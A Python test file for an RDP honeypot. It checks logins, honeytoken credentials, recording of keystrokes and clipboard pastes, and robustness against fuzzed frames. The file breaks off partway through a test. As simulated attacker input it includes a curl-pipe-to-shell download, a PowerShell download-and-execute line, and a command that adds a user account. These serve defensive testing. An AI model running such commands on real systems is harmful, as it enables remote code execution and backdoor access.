"""The RDP honeypot after authentication: a real session, driven by a real client.

Until now the RDP engine ended at the login: a credential-spraying tool got its answer and
every intruder who "got in" was dropped a moment later. These tests connect with aardwolf,
an independent pure-Python RDP client (CredSSP/NTLM and plain TLS), and check what a person
or tool in that position now experiences and what the honeypot records:

* the weak pair this honeypot derives from its name, and a planted honeytoken credential,
  both log in over NLA (the CredSSP exchange runs to completion against a client that checks
  the server's sealed public-key binding) and over plain TLS (the password arrives in the
  Client Info PDU);
* anything else is refused and never reaches a session;
* keystrokes and clicks inside the session are recorded;
* sessions can be turned off.

aardwolf decodes only fast-path bitmap updates, so what is on screen is checked separately,
against FreeRDP, in tests/integration/test_rdp_freerdp.py.
"""

from __future__ import annotations

import asyncio
import os

import pytest

from tests._ports import free_port

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

aardwolf = pytest.importorskip("aardwolf")

pytestmark = pytest.mark.asyncio


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp import credential_match
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    credential_match.invalidate_cache()
    await init_db()
    buffer = event_buffer.get_buffer()
    await buffer.start()
    yield
    await asyncio.sleep(0.2)
    await buffer.stop()
    credential_match.invalidate_cache()
    event_buffer.reset_for_tests()
    await close_db()


async def _serve(tmp_path, monkeypatch, config=None, name="rdp-sess"):
    monkeypatch.chdir(tmp_path)
    from honeypot_mcp.engines.rdp import RDPEngine
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    port = free_port()
    async with get_session() as session:
        session.add(Honeypot(name=name, type=HoneypotType.RDP, port=port))
        await session.flush()
    engine = RDPEngine()
    container = await engine.start(name, port, config or {})
    return engine, container, port


async def _connect(port: int, user: str, password: str, *, nla: bool, channels=None):
    from aardwolf.commons.factory import RDPConnectionFactory
    from aardwolf.commons.iosettings import RDPIOSettings
    from aardwolf.commons.queuedata.constants import VIDEO_FORMAT

    settings = RDPIOSettings()
    settings.channels = [] if channels is None else channels
    settings.video_width, settings.video_height = 1024, 768
    settings.video_bpp_min, settings.video_bpp_max = 15, 32
    settings.video_out_format = VIDEO_FORMAT.PIL
    settings.clipboard_use_pyperclip = False
    scheme = "rdp+ntlm-password" if nla else "rdp+plain"
    from urllib.parse import quote

    # Generated passwords contain @ # / and friends, which would otherwise end the userinfo.
    url = f"{scheme}://CORP\\{quote(user, safe='')}:{quote(password, safe='')}@127.0.0.1:{port}"
    connection = RDPConnectionFactory.from_url(url, settings).get_connection(settings)
    _, error = await asyncio.wait_for(connection.connect(), 30)
    return connection, error


async def _type(connection, text: str) -> None:
    from aardwolf.commons.queuedata.keyboard import RDP_KEYBOARD_UNICODE

    for char in text:
        for pressed in (True, False):
            key = RDP_KEYBOARD_UNICODE()
            key.char, key.is_pressed = char, pressed
            await connection.ext_in_queue.put(key)


async def _click(connection, x: int, y: int) -> None:
    from aardwolf.commons.queuedata.constants import MOUSEBUTTON
    from aardwolf.commons.queuedata.mouse import RDP_MOUSE

    mouse = RDP_MOUSE()
    mouse.xPos, mouse.yPos = x, y
    mouse.button, mouse.is_pressed = MOUSEBUTTON.MOUSEBUTTON_LEFT, True
    await connection.ext_in_queue.put(mouse)


async def _events(event_type: str, wait: float = 10.0) -> list:
    """Alerts of one type, polled gently. The test database is one shared in-memory SQLite
    connection: a SELECT issued while the flusher commits raises `cannot commit transaction -
    SQL statements in progress`, the flusher retries for ~1.5 s and then drops the batch, which
    looked like a lost `rdp_session` event whenever the suite was under load. So each poll
    waits for the buffer to go idle first, and a collision is retried, not fatal."""
    from sqlalchemy import select
    from sqlalchemy.exc import OperationalError

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    deadline = asyncio.get_event_loop().time() + wait
    while True:
        for _ in range(100):
            if event_buffer.get_buffer().qsize() == 0:
                break
            await asyncio.sleep(0.05)
        await asyncio.sleep(0.3)  # the batch just taken off the queue may still be writing
        try:
            async with get_session() as session:
                rows = (await session.execute(select(Alert))).scalars().all()
        except OperationalError:
            rows = []
        found = [a for a in rows if a.event_type == event_type]
        if found or asyncio.get_event_loop().time() > deadline:
            return found
        await asyncio.sleep(0.3)


def _weak(name: str = "rdp-sess") -> tuple[str, str]:
    from honeypot_mcp.engines.http_admin import derive_login

    return derive_login(name)


@pytest.mark.parametrize("nla", [True, False], ids=["nla", "tls"])
async def test_the_weak_pair_gets_a_session_and_what_it_does_is_recorded(
    tmp_path, monkeypatch, nla
):
    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        user, password = _weak()
        connection, error = await _connect(port, user, password, nla=nla)
        assert error is None, error
        await asyncio.sleep(0.8)
        await _type(connection, "whoami /all\n")
        await _click(connection, 30, 30)
        await asyncio.sleep(1.0)
        await connection.terminate()

        [session] = await _events("rdp_session")
        payload = session.payload
        assert payload["stage"] == "active" and session.severity.value == "critical"
        assert payload["typed"] == "whoami /all\n"
        assert payload["clicks"] == [[30, 30]]
        assert payload["desktop"] == "1024x768"
        [start] = await _events("rdp_session_start")
        assert start.severity.value == "critical"
        if not nla:
            # Plain TLS: the client sends the password in the clear, and it is recorded
            # as a login attempt (so honeytoken matching sees it) but kept out of the
            # session record itself.
            [attempt] = await _events("rdp_login_attempt")
            assert attempt.payload["username"] == user and attempt.payload["password"] == password
            assert "password" not in payload["client_info"]
    finally:
        await engine.stop(container)


@pytest.mark.parametrize("nla", [True, False], ids=["nla", "tls"])
async def test_a_wrong_password_is_recorded_but_never_reaches_a_session(tmp_path, monkeypatch, nla):
    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        user, password = _weak()
        connection, error = await _connect(port, user, password + "-wrong", nla=nla)
        assert error is not None  # the client was refused
        await asyncio.sleep(0.5)
        assert not await _events("rdp_session_start", wait=0.5)
        recorded = await _events("rdp_nla_auth" if nla else "rdp_login_attempt")
        assert recorded and recorded[0].payload["username"] == user
    finally:
        await engine.stop(container)


async def test_a_planted_honeytoken_credential_logs_in_over_nla_and_trips_its_token(
    tmp_path, monkeypatch
):
    """The planted password never crosses the wire under NLA, only an NTLMv2 response. The
    honeypot recognises the token from that, recovers the password, and uses it to finish
    the exchange, so the intruder gets a desktop and a CRITICAL alert names the token."""
    from honeypot_mcp.tools.honeytoken import honeytoken_generate_credentials

    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        created = await honeytoken_generate_credentials("planted-rdp", count=1, service="rdp")
        pair = created["metadata"]["credentials"][0]
        connection, error = await _connect(port, pair["username"], pair["password"], nla=True)
        assert error is None, error
        await asyncio.sleep(0.8)
        await connection.terminate()
        [start] = await _events("rdp_session_start")
        assert start.severity.value == "critical"
        tripped = await _events("honeytoken_triggered_credential_via_rdp_nla_auth")
        assert tripped and tripped[0].severity.value == "critical"
    finally:
        await engine.stop(container)


async def test_accepted_logins_replaces_the_derived_pair(tmp_path, monkeypatch):
    engine, container, port = await _serve(
        tmp_path, monkeypatch, {"accepted_logins": ["svc:S3rv1ce!"]}
    )
    try:
        user, password = _weak()
        _, error = await _connect(port, user, password, nla=True)
        assert error is not None  # the derived pair no longer works
        connection, error = await _connect(port, "svc", "S3rv1ce!", nla=True)
        assert error is None, error
        await connection.terminate()
    finally:
        await engine.stop(container)


async def test_an_empty_accepted_logins_lets_nobody_in(tmp_path, monkeypatch):
    engine, container, port = await _serve(tmp_path, monkeypatch, {"accepted_logins": []})
    try:
        user, password = _weak()
        _, error = await _connect(port, user, password, nla=True)
        assert error is not None
    finally:
        await engine.stop(container)


async def test_sessions_can_be_switched_off(tmp_path, monkeypatch):
    engine, container, port = await _serve(tmp_path, monkeypatch, {"sessions": False})
    try:
        user, password = _weak()
        _, error = await _connect(port, user, password, nla=True)
        assert error is not None
        assert not await _events("rdp_session_start", wait=0.5)
        assert await _events("rdp_nla_auth")  # the hash is still captured
    finally:
        await engine.stop(container)


# ── pieces that do not need a client ─────────────────────────────────────────


async def test_the_scancode_recorder_applies_shift_caps_lock_and_backspace():
    from honeypot_mcp.engines.rdp_session import InputRecorder

    recorder = InputRecorder()
    shift_down, shift_up, release = 0x0000, 0x8000, 0x8000
    for flags, code in [
        (shift_down, 0x2A), (shift_down, 0x23), (shift_up, 0x2A),  # Shift+h -> H
        (shift_down, 0x17), (release, 0x17),  # i
        (shift_down, 0x0B),  # 0
        (shift_down, 0x0E),  # backspace removes the 0
        (shift_down, 0x3A), (shift_down, 0x1E),  # caps lock on, a -> A
        (shift_down, 0x5B),  # windows key
    ]:  # fmt: skip
        recorder.on_scancode(flags, code)
    assert "".join(recorder.typed) == "HiA"
    assert "windows_key" in recorder.summary()["special_keys"]


async def test_the_input_recorder_is_bounded_however_much_is_sent():
    from honeypot_mcp.engines.rdp_session import MAX_CLICKS, MAX_TYPED, InputRecorder

    recorder = InputRecorder()
    for _ in range(MAX_TYPED * 3):
        recorder.on_unicode(0, ord("a"))
        recorder.on_mouse(0x8000 | 0x1000, 1, 1)
    summary = recorder.summary()
    assert len(summary["typed"]) == MAX_TYPED and len(summary["clicks"]) == MAX_CLICKS


async def test_a_spnego_wrapped_ntlm_negotiate_is_unwrapped_and_a_bare_one_is_left_alone():
    """Windows' own client wraps its NTLM message in SPNEGO; scanners send it bare. The
    server must read both and answer in kind."""
    from honeypot_mcp.engines.rdp_nla import _der, parse_negotiate, unwrap_ntlm, wrap_challenge

    negotiate = (
        b"NTLMSSP\x00" + (1).to_bytes(4, "little") + (0xE2088297).to_bytes(4, "little") + bytes(16)
    )
    oid = bytes.fromhex("2b0601050502")
    mech_types = _der(0xA0, _der(0x30, _der(0x06, bytes.fromhex("2b06010401823702020a"))))
    init = _der(0xA0, _der(0x30, mech_types + _der(0xA2, _der(0x04, negotiate))))
    wrapped = _der(0x60, _der(0x06, oid) + init)

    inner, was_wrapped = unwrap_ntlm(wrapped)
    assert was_wrapped and inner == negotiate and parse_negotiate(inner) is not None
    bare, was_wrapped = unwrap_ntlm(negotiate)
    assert not was_wrapped and bare == negotiate
    reply = wrap_challenge(b"NTLMSSP\x00challenge")
    assert reply[0] == 0xA1 and b"NTLMSSP\x00challenge" in reply


async def test_client_info_is_parsed_and_a_truncated_one_is_not_trusted():
    import struct

    from honeypot_mcp.engines.rdp_session import parse_client_info

    def utf16(text: str) -> bytes:
        return text.encode("utf-16-le")

    domain, user, password = utf16("CORP"), utf16("admin"), utf16("hunter2")
    packet = struct.pack("<HH", 0x0040, 0) + struct.pack(
        "<IIHHHHH", 0, 0x33, len(domain), len(user), len(password), 0, 0
    )
    packet += (
        domain + b"\x00\x00" + user + b"\x00\x00" + password + b"\x00\x00" + b"\x00\x00\x00\x00"
    )
    info = parse_client_info(packet)
    assert (
        info["domain"] == "CORP" and info["username"] == "admin" and info["password"] == "hunter2"
    )
    # A length field that points past the end must not read beyond the buffer.
    broken = bytearray(packet)
    struct.pack_into("<H", broken, 12, 400)
    result = parse_client_info(bytes(broken))
    assert result is None or "password" not in result or result["password"] == ""


async def test_the_session_loop_survives_hostile_frames_and_stays_bounded():
    """After login the peer controls every byte. Random and half-valid frames (real TPKT and
    X.224 headers around garbage MCS/share PDUs, impossible lengths, truncated input events)
    must end the session cleanly, never raise, and never make the server write without
    bound."""
    import random

    from honeypot_mcp.engines.rdp_session import run_session

    class Sink:
        def __init__(self) -> None:
            self.written = 0

        def write(self, data: bytes) -> None:
            self.written += len(data)

        async def drain(self) -> None:
            return None

        def is_closing(self) -> bool:
            return False

    async def accept(_info: dict) -> bool:
        return True

    connect_initial = (
        b"\x7f\x65junk" + b"Duca" + b"\x20" + b"\x01\xc0\x08\x00\x04\x00\x08\x00\x00\x03\x00\x02"
    )
    for seed in range(150):
        rng = random.Random(seed)
        stream = b""
        for _ in range(rng.randint(1, 40)):
            kind = rng.random()
            if kind < 0.3:
                stream += rng.randbytes(rng.randint(1, 64))
            else:
                mcs_type = rng.choice([0x04, 0x28, 0x38, 0x64, 0x21, 0x70])
                body = bytes([mcs_type]) + rng.randbytes(rng.randint(0, 80))
                length = rng.choice([len(body) + 7, 0, 6, 65535, rng.randint(0, 300)])
                stream += b"\x03\x00" + length.to_bytes(2, "big") + b"\x02\xf0\x80" + body
        reader = asyncio.StreamReader()
        reader.feed_data(stream)
        reader.feed_eof()
        sink = Sink()
        result = await run_session(
            reader, sink, connect_initial=connect_initial, selected_protocol=1, decide_login=accept
        )
        assert "ended_by" in result, (seed, result)
        assert sink.written < 4 * 1024 * 1024, seed


@pytest.mark.parametrize("with_clipboard", [False, True], ids=["plain", "clipboard"])
async def test_mutating_a_real_recorded_session_never_breaks_the_session_loop(
    tmp_path, monkeypatch, with_clipboard
):
    """Random bytes rarely get past the first check. A real client's frames do: record them
    from an actual aardwolf login, then replay thousands of corrupted variants (flipped
    bytes, truncation, duplication, reordering) straight into the session loop."""
    import random
    import struct

    from honeypot_mcp.engines import rdp_session

    recorded: list[tuple[str, bytes]] = []
    real_read = rdp_session.read_frame

    async def recording(reader, timeout):
        kind, body = await real_read(reader, timeout)
        recorded.append((kind, body))
        return kind, body

    monkeypatch.setattr(rdp_session, "read_frame", recording)
    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        user, password = _weak()
        channels = None
        if with_clipboard:
            from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel

            channels = [RDPECLIPChannel]
        connection, error = await _connect(port, user, password, nla=False, channels=channels)
        assert error is None, error
        await asyncio.sleep(0.6)
        if with_clipboard:
            from aardwolf.commons.queuedata.clipboard import RDP_CLIPBOARD_DATA_TXT

            await connection.ext_in_queue.put(RDP_CLIPBOARD_DATA_TXT("whoami /priv"))
            await asyncio.sleep(0.8)
        await _type(connection, "net user\n")
        await _click(connection, 40, 40)
        await asyncio.sleep(0.6)
        await connection.terminate()
    finally:
        await engine.stop(container)
    monkeypatch.setattr(rdp_session, "read_frame", real_read)
    assert len(recorded) > 10  # a whole handshake and some input

    def wire(frames) -> bytes:
        out = b""
        for kind, body in frames:
            if kind == "slow":
                out += struct.pack(">BBH", 3, 0, len(body) + 4) + body
            else:
                out += bytes([0x00, len(body) + 2 & 0x7F]) + body
        return out

    class Sink:
        def __init__(self) -> None:
            self.written = 0

        def write(self, data: bytes) -> None:
            self.written += len(data)

        async def drain(self) -> None:
            return None

        def is_closing(self) -> bool:
            return False

    async def accept(_info: dict) -> bool:
        return True

    initial = next(body for kind, body in recorded if kind == "slow")
    rest = recorded[1:]
    for seed in range(300):
        rng = random.Random(seed)
        frames = [(k, bytearray(b)) for k, b in rest]
        for _ in range(rng.randint(1, 6)):
            op = rng.choice(["flip", "truncate", "duplicate", "swap", "grow"])
            i = rng.randrange(len(frames))
            if op == "flip" and frames[i][1]:
                frames[i][1][rng.randrange(len(frames[i][1]))] = rng.randrange(256)
            elif op == "truncate":
                del frames[i][1][rng.randrange(len(frames[i][1]) + 1) :]
            elif op == "duplicate":
                frames.insert(i, (frames[i][0], bytearray(frames[i][1])))
            elif op == "swap":
                j = rng.randrange(len(frames))
                frames[i], frames[j] = frames[j], frames[i]
            else:
                frames[i][1].extend(rng.randbytes(rng.randint(1, 4000)))
        reader = asyncio.StreamReader()
        reader.feed_data(wire([(k, bytes(b)) for k, b in frames]))
        reader.feed_eof()
        sink = Sink()
        result = await rdp_session.run_session(
            reader, sink, connect_initial=initial, selected_protocol=1, decide_login=accept
        )
        assert "ended_by" in result, (seed, result)
        assert sink.written < 8 * 1024 * 1024, seed  # a desktop is ~2 MB; never unbounded


async def test_a_canary_string_in_the_password_field_is_not_a_login(tmp_path, monkeypatch):
    """`submit_event` sets `honeytoken_id` for ANY planted token found in a payload string (a
    canary email, a JWT id, an SSH fingerprint), not only a matched credential. Treating that
    as "the credential was planted" let a visitor type a canary email as the password and
    get a session as any username."""
    from honeypot_mcp import token_matchers
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeytoken, HoneytokenStatus, HoneytokenType

    canary = "canary-0123456789abcdef@corp.local"
    async with get_session() as session:
        session.add(
            Honeytoken(
                type=HoneytokenType.DB_ROW,
                label="canary",
                token_value=canary,
                status=HoneytokenStatus.ACTIVE,
                token_meta={"canary_email": canary},
            )
        )
    token_matchers.invalidate_cache()
    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        _, error = await _connect(port, "nosuchuser", canary, nla=False)
        assert error is not None
        assert not await _events("rdp_session_start", wait=0.5)
    finally:
        await engine.stop(container)


async def test_a_planted_credential_logs_in_over_plain_tls_too(tmp_path, monkeypatch):
    """Under NLA a planted password is recognised from an NTLM response; over plain TLS it
    arrives in the clear. The RDP matcher only knew the first, so a planted credential typed
    into a plain-TLS client was refused and never tripped its token."""
    from honeypot_mcp.tools.honeytoken import honeytoken_generate_credentials

    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        created = await honeytoken_generate_credentials("planted-tls", count=1, service="rdp")
        pair = created["metadata"]["credentials"][0]
        connection, error = await _connect(port, pair["username"], pair["password"], nla=False)
        assert error is None, error
        await asyncio.sleep(0.5)
        await connection.terminate()
        tripped = await _events("honeytoken_triggered_credential_via_rdp_login_attempt")
        assert tripped and tripped[0].severity.value == "critical"
    finally:
        await engine.stop(container)


def _client_frames(*, font_lists: int = 0, refreshes: int = 0) -> bytes:
    """A hand-built client: handshake, Client Info, Confirm Active, then repeated requests."""
    import struct

    from honeypot_mcp.engines.rdp_session import CLIENT_USER, IO_CHANNEL, per_length

    def tpkt(mcs: bytes) -> bytes:
        body = b"\x02\xf0\x80" + mcs
        return struct.pack(">BBH", 3, 0, len(body) + 4) + body

    def to_io(data: bytes) -> bytes:
        return tpkt(
            b"\x64"
            + struct.pack(">HH", CLIENT_USER - 1001, IO_CHANNEL)
            + b"\x70"
            + per_length(len(data))
            + data
        )

    def data_pdu(type2: int, payload: bytes) -> bytes:
        header = struct.pack("<IBBHBBH", 0x103EA, 0, 1, len(payload) + 4, type2, 0, 0)
        body = header + payload
        return to_io(struct.pack("<HHH", len(body) + 6, 0x17, CLIENT_USER) + body)

    user = "admin".encode("utf-16-le")
    info = struct.pack("<HH", 0x0040, 0) + struct.pack("<IIHHHHH", 0, 0x33, 0, len(user), 0, 0, 0)
    info += b"\x00\x00" + user + b"\x00\x00" * 4
    confirm = struct.pack("<HHH", 14, 0x13, CLIENT_USER) + struct.pack("<IHH", 0x103EA, 0, 0)
    confirm += struct.pack("<HH", 0, 0)
    stream = (
        tpkt(b"\x04\x01\x00\x01\x00")
        + tpkt(b"\x28")
        + tpkt(b"\x38" + struct.pack(">HH", 6, IO_CHANNEL))
    )
    stream += to_io(info) + to_io(confirm)
    stream += data_pdu(0x14, struct.pack("<HHI", 1, 0, 0))  # request control
    for _ in range(font_lists):
        stream += data_pdu(0x27, struct.pack("<HHHH", 0, 0, 3, 50))
    for _ in range(refreshes):
        stream += data_pdu(0x21, struct.pack("<HH", 0, 0) + bytes(8))
    return stream


async def _run_hostile_client(stream: bytes):
    from honeypot_mcp.engines.rdp_session import run_session

    class Sink:
        def __init__(self) -> None:
            self.written = 0

        def write(self, data: bytes) -> None:
            self.written += len(data)

        async def drain(self) -> None:
            return None

        def is_closing(self) -> bool:
            return False

    activations = []

    async def accept(_info: dict) -> bool:
        return True

    async def active(_info: dict) -> None:
        activations.append(1)

    reader = asyncio.StreamReader()
    reader.feed_data(stream)
    reader.feed_eof()
    sink = Sink()
    result = await run_session(
        reader, sink, connect_initial=b"junk" + b"Duca", selected_protocol=1,
        decide_login=accept, on_active=active,
    )  # fmt: skip
    return result, sink.written, len(activations)


async def test_repeated_font_lists_do_not_resend_the_desktop_or_refire_the_alert():
    """A logged-in peer could send a few KB of Font List PDUs and be answered with the whole
    desktop each time (4.7 GB out for 130 KB in) while raising one CRITICAL alert apiece."""
    result, written, activations = await _run_hostile_client(_client_frames(font_lists=2000))
    assert activations == 1 and result["stage"] == "active"
    assert written < 6 * 1024 * 1024  # one desktop, ~2 MB, plus small replies


async def test_refresh_rect_is_rate_limited_and_total_output_is_capped():
    from honeypot_mcp.engines.rdp_session import MAX_OUTPUT_BYTES, MAX_REFRESHES

    result, written, _ = await _run_hostile_client(_client_frames(font_lists=1, refreshes=3000))
    # the first desktop plus at most MAX_REFRESHES more
    assert written < (MAX_REFRESHES + 2) * 2_500_000
    assert written < MAX_OUTPUT_BYTES + 2_500_000


# ── clipboard (MS-RDPECLIP) ──────────────────────────────────────────────────


def _clip_message(msg_type: int, flags: int, data: bytes) -> bytes:
    import struct

    return struct.pack("<HHI", msg_type, flags, len(data)) + data


def _as_chunk(message: bytes, *, first=True, last=True, total=None) -> bytes:
    import struct

    flags = 0x10 | (1 if first else 0) | (2 if last else 0)
    return struct.pack("<II", len(message) if total is None else total, flags) + message


def _format_list(*ids: int) -> bytes:
    import struct

    return _clip_message(2, 0, b"".join(struct.pack("<I", i) + bytes(32) for i in ids))


async def test_the_clipboard_conversation_asks_for_text_and_records_it():
    import struct

    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel

    channel = ClipboardChannel()
    opening = channel.opening()
    assert struct.unpack_from("<HH", opening[0]) == (7, 0) and struct.unpack_from(
        "<H", opening[1]
    ) == (1,)

    replies = channel.feed(_as_chunk(_format_list(13, 1, 0xC001)))
    assert [struct.unpack_from("<HH", r)[0] for r in replies] == [3, 4]  # accepted, then asked
    assert struct.unpack_from("<I", replies[1], 8)[0] == 13  # for Unicode text

    text = "powershell -nop -c iex(iwr http://198.51.100.9/a)".encode("utf-16-le") + b"\x00\x00"
    assert channel.feed(_as_chunk(_clip_message(5, 1, text))) == []
    assert channel.texts == ["powershell -nop -c iex(iwr http://198.51.100.9/a)"]
    assert {13, 1, 0xC001} <= channel.formats_seen


async def test_clipboard_messages_may_arrive_in_pieces_and_garbage_is_ignored():
    from honeypot_mcp.engines.rdp_cliprdr import MAX_MESSAGE, ClipboardChannel

    channel = ClipboardChannel()
    channel.feed(_as_chunk(_format_list(1)))  # plain ANSI text this time
    body = _clip_message(5, 1, b"net user hax P@ss /add\x00")
    channel.feed(_as_chunk(body[:10], last=False, total=len(body)))
    channel.feed(_as_chunk(body[10:], first=False, total=len(body)))
    assert channel.texts == ["net user hax P@ss /add"]

    for junk in (b"", b"\x01", _as_chunk(b"\x00" * 3), _as_chunk(b"x" * 20, first=False)):
        assert channel.feed(junk) == []
    assert channel.feed(_as_chunk(b"y" * 8, total=MAX_MESSAGE + 1)) == []  # refused up front
    assert channel.feed(_as_chunk(_clip_message(5, 1, b"short"), total=2)) == []  # lies about size


async def test_a_request_for_the_servers_clipboard_is_declined_and_recording_is_bounded():
    import struct

    from honeypot_mcp.engines.rdp_cliprdr import MAX_TEXT_CHARS, MAX_TEXTS, ClipboardChannel

    channel = ClipboardChannel()
    [reply] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
    assert struct.unpack_from("<HH", reply) == (5, 2)  # a data response marked as failed

    for n in range(MAX_TEXTS + 10):
        channel.feed(_as_chunk(_format_list(13)))
        big = (f"paste {n} " + "A" * (MAX_TEXT_CHARS * 2)).encode("utf-16-le") + b"\x00\x00"
        channel.feed(_as_chunk(_clip_message(5, 1, big)))
    assert len(channel.texts) == MAX_TEXTS
    assert all(len(t) <= MAX_TEXT_CHARS for t in channel.texts)


async def test_pasted_text_is_recorded_with_control_characters_defanged():
    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel

    channel = ClipboardChannel()
    channel.feed(_as_chunk(_format_list(13)))
    nasty = "ok\x1b[31m\x07line\r\nnext".encode("utf-16-le") + b"\x00\x00"
    channel.feed(_as_chunk(_clip_message(5, 1, nasty)))
    assert channel.texts == ["ok?[31m?line\r\nnext"]


async def test_a_real_client_pasting_into_the_session_is_recorded(tmp_path, monkeypatch):
    """aardwolf negotiates the clipboard channel like mstsc and FreeRDP do; text copied on its
    side is announced, requested by the honeypot, and recorded with an event of its own."""
    from aardwolf.commons.queuedata.clipboard import RDP_CLIPBOARD_DATA_TXT
    from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel

    engine, container, port = await _serve(tmp_path, monkeypatch)
    try:
        user, password = _weak()
        connection, error = await _connect(
            port, user, password, nla=True, channels=[RDPECLIPChannel]
        )
        assert error is None, error
        await asyncio.sleep(1.0)  # the server opens the conversation once the desktop is up
        await connection.ext_in_queue.put(
            RDP_CLIPBOARD_DATA_TXT("curl -s http://203.0.113.7/x.sh | sh")
        )
        await asyncio.sleep(1.5)
        await connection.terminate()

        [pasted] = await _events("rdp_clipboard")
        assert pasted.payload["text"] == "curl -s http://203.0.113.7/x.sh | sh"
        assert pasted.severity.value == "high"
        [session] = await _events("rdp_session")
        assert session.payload["clipboard"] == ["curl -s http://203.0.113.7/x.sh | sh"]
    finally:
        await engine.stop(container)


# ── clipboard offered back ───────────────────────────────────────────────────


async def test_an_offered_clipboard_is_announced_after_the_clients_first_list_then_served():
    import struct

    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel

    channel = ClipboardChannel("backup password: see \x1b[31mvault")
    assert [struct.unpack_from("<H", m)[0] for m in channel.opening()] == [7, 1]  # caps, ready
    # Announced only once the client's own initial Format List has been answered; before that a
    # real client (aardwolf, mstsc) ignores everything but the Format List Response.
    replies = channel.feed(_as_chunk(_format_list(13)))
    assert [struct.unpack_from("<H", m)[0] for m in replies] == [3, 4]  # accepted, asked for text
    # The server's own list follows the answer to that request: sent alongside it, it would claim
    # clipboard ownership and cancel the request still in flight.
    after = channel.feed(
        _as_chunk(_clip_message(5, 1, "first paste".encode("utf-16-le") + b"\x00\x00"))
    )
    assert [struct.unpack_from("<H", m)[0] for m in after] == [2]
    assert struct.unpack_from("<I", after[0], 8)[0] == 13  # Unicode text
    assert channel.texts == ["first paste"]
    again = channel.feed(_as_chunk(_format_list(13)))
    assert [struct.unpack_from("<H", m)[0] for m in again] == [3, 4]  # announced once only

    [reply] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
    assert struct.unpack_from("<HH", reply) == (5, 1)  # data response, OK
    assert reply[8:].decode("utf-16-le").rstrip("\x00") == "backup password: see ?[31mvault"
    [ansi] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 1))))
    assert ansi[8:].endswith(b"\x00") and b"backup password" in ansi
    assert channel.offer_reads == 2
    [refused] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 0xC001))))
    assert struct.unpack_from("<HH", refused) == (5, 2)  # a format it never announced


async def test_without_an_offer_nothing_is_announced_and_requests_are_refused():
    import struct

    from honeypot_mcp.engines.rdp_cliprdr import MAX_OFFER_CHARS, ClipboardChannel

    plain = ClipboardChannel()
    assert len(plain.opening()) == 2 and plain.offer_reads == 0
    [reply] = plain.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
    assert struct.unpack_from("<HH", reply) == (5, 2)
    assert len(ClipboardChannel("x" * 5000).offer or "") == MAX_OFFER_CHARS


async def test_a_real_client_pulls_the_offered_clipboard_and_the_session_says_so(
    tmp_path, monkeypatch
):
    from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel

    engine, container, port = await _serve(
        tmp_path, monkeypatch, {"clipboard_text": "svc-backup / Winter2026!"}
    )
    try:
        user, password = _weak()
        connection, error = await _connect(
            port, user, password, nla=True, channels=[RDPECLIPChannel]
        )
        assert error is None, error
        received = None
        for _ in range(40):  # aardwolf requests a server's text on its own
            await asyncio.sleep(0.25)
            while not connection.ext_out_queue.empty():
                item = connection.ext_out_queue.get_nowait()
                if getattr(item, "data", None) == "svc-backup / Winter2026!":
                    received = item
            if received:
                break
        await connection.terminate()
        assert received is not None, "the client never received the offered clipboard"
        [session] = await _events("rdp_session")
        assert session.payload["clipboard_offer_read"] >= 1
    finally:
        await engine.stop(container)


async def test_a_bug_in_the_desktop_still_leaves_a_session_record(monkeypatch):
    """If rendering or the shell ever raises, the visitor's session summary (what they typed up
    to then) must still be produced, not lost with the exception."""
    from honeypot_mcp.engines import rdp_desktop

    def boom(self, actions, now=None):
        raise RuntimeError("bug in the desktop")

    monkeypatch.setattr(rdp_desktop.Desktop, "apply", boom)
    stream = _client_frames(font_lists=1)
    # a few keystrokes after the handshake: an Input PDU with scancode events
    import struct

    from honeypot_mcp.engines.rdp_session import CLIENT_USER, IO_CHANNEL, per_length

    def key(code: int) -> bytes:
        return struct.pack("<IHHHH", 0, 0x0004, 0, code, 0)

    events = b"".join(key(c) for c in (0x11, 0x23, 0x18))  # w h o
    payload = struct.pack("<HH", 3, 0) + events
    body = struct.pack("<IBBHBBH", 0x103EA, 0, 1, len(payload) + 4, 0x1C, 0, 0) + payload
    pdu = struct.pack("<HHH", len(body) + 6, 0x17, CLIENT_USER) + body
    mcs = (
        b"\x64"
        + struct.pack(">HH", CLIENT_USER - 1001, IO_CHANNEL)
        + b"\x70"
        + per_length(len(pdu))
        + pdu
    )
    frame = b"\x03\x00" + struct.pack(">H", len(mcs) + 7) + b"\x02\xf0\x80" + mcs
    result, _written, _ = await _run_hostile_client(stream + frame)
    assert result["ended_by"] == "internal error"
    assert result["stage"] == "active" and result["typed"] == "who"


# ── second review: input ────────────────────────────────────────────────────


def test_ctrl_and_alt_combinations_are_not_typed_text_and_a_lost_win_key_up_recovers():
    from honeypot_mcp.engines.rdp_session import InputRecorder

    recorder = InputRecorder()
    down, up = 0x0000, 0x8000
    for flags, code in [
        (down, 0x1D), (down, 0x2F), (up, 0x2F), (up, 0x1D),  # Ctrl+V
        (down, 0x1D), (down, 0x2E), (up, 0x2E), (up, 0x1D),  # Ctrl+C
        (down, 0x38), (down, 0x0F), (up, 0x0F), (up, 0x38),  # Alt+Tab
    ]:  # fmt: skip
